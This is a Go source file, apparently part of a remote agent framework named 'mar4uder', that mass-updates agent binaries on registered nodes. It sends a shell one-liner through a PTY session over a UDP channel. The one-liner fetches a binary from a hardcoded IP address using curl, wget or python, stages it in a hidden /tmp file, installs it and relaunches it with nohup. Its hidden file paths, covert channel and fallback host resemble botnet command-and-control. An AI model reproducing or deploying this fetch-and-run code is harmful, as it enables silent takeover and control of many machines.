package main

import (
	"fmt"
	"strings"
	"sync"
	"time"
)

// UpdateManager handles seamless remote upgrades of agent binaries
type UpdateManager struct {
	nm    *NodeManager
	udpGw *UDPGateway
	cfg   *Config
}

// NewUpdateManager creates an instance of UpdateManager
func NewUpdateManager(nm *NodeManager, udpGw *UDPGateway, cfg *Config) *UpdateManager {
	return &UpdateManager{
		nm:    nm,
		udpGw: udpGw,
		cfg:   cfg,
	}
}

// UpdateNode upgrades the agent binary on a target node
func (um *UpdateManager) UpdateNode(target *Node, serverHost string) (string, error) {
	if target == nil {
		return "", fmt.Errorf("target node is nil")
	}

	httpPort := "8080"
	if parts := strings.Split(um.cfg.HTTPAddr, ":"); len(parts) >= 2 {
		httpPort = parts[len(parts)-1]
	}

	if serverHost == "" || serverHost == "0.0.0.0" || serverHost == "127.0.0.1" || serverHost == "localhost" {
		serverHost = "104.143.206.163"
	}

	target.mu.RLock()
	nodeID := target.ID
	target.mu.RUnlock()

	// Multi-stage auto-updater script:
	// 1. Tries curl, then wget, then python3 urllib
	// 2. Verifies size > 30,000 bytes
	// 3. Atomically replaces target binary
	// 4. Restarts systemd unit or spawns background process
	updateCmd := fmt.Sprintf(
		"sh -c '"+
			"TMP_NEW=\"/tmp/.m4r_upd_$$\"; "+
			"URL=\"http://%s:%s/bin/agent\"; "+
			"ERR=\"\"; "+
			"if which curl >/dev/null 2>&1; then "+
			"  ERR=$(curl -fsSL \"$URL\" -o \"$TMP_NEW\" 2>&1); "+
			"elif which wget >/dev/null 2>&1; then "+
			"  ERR=$(wget -qO \"$TMP_NEW\" \"$URL\" 2>&1); "+
			"elif which python3 >/dev/null 2>&1; then "+
			"  ERR=$(python3 -c \"import urllib.request; urllib.request.urlretrieve('\"$URL\"', '\"$TMP_NEW\"')\" 2>&1); "+
			"elif which python >/dev/null 2>&1; then "+
			"  ERR=$(python -c \"import urllib; urllib.urlretrieve('\"$URL\"', '\"$TMP_NEW\"')\" 2>&1); "+
			"else "+
			"  ERR=\"no curl, wget, or python found\"; "+
			"fi; "+
			"SZ=0; [ -f \"$TMP_NEW\" ] && SZ=$(wc -c < \"$TMP_NEW\"); "+
			"if [ -s \"$TMP_NEW\" ] && [ \"$SZ\" -gt 30000 ]; then "+
			"  chmod +x \"$TMP_NEW\"; "+
			"  DEST=\"/usr/local/bin/mar4uder_agent\"; "+
			"  [ ! -w \"/usr/local/bin\" ] && DEST=\"$HOME/.local/bin/mar4uder_agent\"; "+
			"  mkdir -p \"$(dirname \"$DEST\")\"; "+
			"  cp -f \"$TMP_NEW\" \"$DEST\"; "+
			"  rm -f \"$TMP_NEW\"; "+
			"  echo \"[M4R_UPDATE_SUCCESS:$DEST]\"; "+
			"  (systemctl restart mar4uder-agent 2>/dev/null || systemctl restart mar4uder 2>/dev/null || (pkill -9 -f mar4uder_agent && nohup \"$DEST\" %s:443 %s >/dev/null 2>&1 &)); "+
			"else "+
			"  rm -f \"$TMP_NEW\"; "+
			"  echo \"[M4R_UPDATE_FAILED:Download error ($ERR), size: ${SZ}B, expected >30000B]\"; "+
			"fi' \n",
		serverHost, httpPort, serverHost, nodeID,
	)

	// Ensure PTY session is active
	_, _ = um.udpGw.SendSessionOpen(target, 120, 35)
	time.Sleep(100 * time.Millisecond)

	subID := fmt.Sprintf("upd-%d", time.Now().UnixNano())
	ptyCh := target.AddPTYSubscriber(subID)
	defer target.RemovePTYSubscriber(subID)

	_ = um.udpGw.SendPtyData(target, []byte(updateCmd))
	target.AddLog("Remote agent binary update dispatched")

	var output strings.Builder
	timer := time.NewTimer(12 * time.Second)
	defer timer.Stop()

	for {
		select {
		case <-timer.C:
			return output.String(), fmt.Errorf("update timed out (verify node connectivity)")
		case chunk, ok := <-ptyCh:
			if !ok {
				return output.String(), nil
			}
			output.Write(chunk)
			cur := output.String()
			if strings.Contains(cur, "[M4R_UPDATE_SUCCESS:") {
				return fmt.Sprintf("SUCCESS: Node [%s] updated to latest binary", nodeID), nil
			}
			if strings.Contains(cur, "[M4R_UPDATE_FAILED:") {
				return cur, fmt.Errorf("update script reported failure on node [%s]", nodeID)
			}
		}
	}
}

// UpdateAll upgrades all registered nodes concurrently
func (um *UpdateManager) UpdateAll(serverHost string) map[string]string {
	nodes := um.nm.ListNodes()
	results := make(map[string]string)
	var mu sync.Mutex
	var wg sync.WaitGroup

	for _, n := range nodes {
		wg.Add(1)
		go func(target *Node) {
			defer wg.Done()
			status, err := um.UpdateNode(target, serverHost)
			mu.Lock()
			if err != nil {
				results[target.ID] = fmt.Sprintf("FAILED: %v", err)
			} else {
				results[target.ID] = status
			}
			mu.Unlock()
		}(n)
	}

	wg.Wait()
	return results
}
